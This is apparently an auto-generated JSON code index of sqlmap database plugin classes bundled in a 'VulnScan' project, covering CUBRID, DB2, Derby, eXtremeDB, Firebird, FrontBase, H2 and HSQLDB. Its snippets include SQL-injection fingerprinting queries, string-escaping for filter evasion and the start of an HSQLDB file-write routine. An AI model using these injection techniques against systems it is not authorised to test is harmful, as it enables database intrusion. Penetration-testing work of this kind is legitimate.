        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/CUBRID/cubrid-python\n    User guide: https://github.com/CUBRID/cubrid-python/blob/develop/README.md\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: BSD License\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on Cubrid it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getStatements(self):\n        warnMsg = \"on Cubrid it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n        return []\n    def getRoles(self, *args, **kwargs):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CUBRID)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Cubrid it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Cubrid it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Cubrid it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.db2.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.db2.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/ibmdb/python-ibmdb\n    User guide: https://github.com/ibmdb/python-ibmdb/wiki/README\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Apache License 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.db2.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.db2.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.db2.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on IBM DB2 it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getStatements(self):\n        warnMsg = \"on IBM DB2 it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n        return []",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.db2.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.db2.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.db2.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.db2.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.db2.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.db2.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.DB2)\n    def _versionCheck(self):\n        minor, major = None, None\n        for version in reversed(xrange(5, 15)):\n            result = inject.checkBooleanExpression(\"(SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN %d000000 AND %d999999)>0\" % (version, version))\n            if result:\n                major = version\n                for version in reversed(xrange(0, 20)):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.db2.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.db2.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.db2.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.db2.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.db2.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.db2.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def __init__(self):\n        self.__basedir = None\n        self.__datadir = None\n        GenericTakeover.__init__(self)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.db2.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.derby.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.derby.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/nakagami/pydrda/\n    User guide: https://github.com/nakagami/pydrda/blob/master/README.rst\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: MIT\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.derby.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.derby.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.derby.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on Apache Derby it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getStatements(self):\n        warnMsg = \"on Apache Derby it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n        return []\n    def getPrivileges(self, *args, **kwargs):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.derby.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.derby.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.derby.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.derby.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.derby.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.derby.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.DERBY)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.derby.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.derby.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.derby.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n        return expression",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.derby.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.derby.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.derby.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Apache Derby it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Apache Derby it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Apache Derby it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.derby.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on eXtremeDB it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on eXtremeDB it is not possible to get the banner\"\n        logger.warning(warnMsg)\n        return None\n    def getCurrentUser(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n    def getCurrentDb(self):\n        warnMsg = \"on eXtremeDB it is not possible to get name of the current database\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on eXtremeDB it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on eXtremeDB it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.EXTREMEDB)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n        return expression",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on eXtremeDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on eXtremeDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on eXtremeDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.extremedb.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.firebird.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.firebird.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://kinterbasdb.sourceforge.net/\n    User guide: http://kinterbasdb.sourceforge.net/dist_docs/usage.html\n    Debian package: python-kinterbasdb\n    License: BSD\n    \"\"\"\n    # sample usage:\n    # ./sqlmap.py -d \"firebird://sysdba:testpass@/opt/firebird/testdb.fdb\"\n    # ./sqlmap.py -d \"firebird://sysdba:testpass@127.0.0.1:3050//opt/firebird/testdb.fdb\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.firebird.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.firebird.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.firebird.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getDbs(self):\n        warnMsg = \"on Firebird it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n        return []\n    def getPasswordHashes(self):\n        warnMsg = \"on Firebird it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def searchDb(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.firebird.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.firebird.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.firebird.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Firebird it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Firebird it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.firebird.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.firebird.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.firebird.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.FIREBIRD)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.firebird.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.firebird.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.firebird.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Backend.setVersion('2.0')\n        ['2.0']\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        >>> Backend.setVersion('2.1')",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.firebird.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.firebird.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.firebird.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Firebird it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Firebird it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Firebird it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.firebird.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on FrontBase it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on FrontBase it is not possible to get the banner\"\n        logger.warning(warnMsg)\n        return None\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on FrontBase it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n        return {}\n    def getHostname(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on FrontBase it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on FrontBase it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.FRONTBASE)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n        return expression",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on FrontBase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on FrontBase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on FrontBase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.frontbase.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.h2.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.h2.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on H2 it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.h2.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.h2.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.h2.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        if not conf.getBanner:\n            return\n        if kb.data.banner is None:\n            infoMsg = \"fetching banner\"\n            logger.info(infoMsg)\n            query = queries[DBMS.H2].banner.query\n            kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=True))\n        return kb.data.banner",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.h2.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.h2.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.h2.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on H2 it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on H2 it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.h2.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.h2.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.h2.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.H2)\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n        if fork is None:\n            if inject.checkBooleanExpression(\"EXISTS(SELECT * FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME='IGNITE')\"):\n                fork = FORK.IGNITE\n            else:\n                fork = \"\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.h2.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.h2.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.h2.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.h2.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.h2.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.h2.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on H2 it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on H2 it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on H2 it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.h2.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://pypi.python.org/pypi/JayDeBeApi/ & http://jpype.sourceforge.net/\n    User guide: https://pypi.python.org/pypi/JayDeBeApi/#usage & http://jpype.sourceforge.net/doc/user-guide/userguide.html\n    API: -\n    Debian package: -\n    License: LGPL & Apache License 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        if not conf.getBanner:\n            return\n        if kb.data.banner is None:\n            infoMsg = \"fetching banner\"\n            logger.info(infoMsg)\n            query = queries[DBMS.HSQLDB].banner.query\n            kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=True))\n        return kb.data.banner",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on HSQLDB it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    @stackedmethod\n    def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        funcName = randomStr()\n        max_bytes = 1024 * 1024\n        debugMsg = \"creating JLP procedure '%s'\" % funcName\n        logger.debug(debugMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.HSQLDB)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp and not conf.api:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
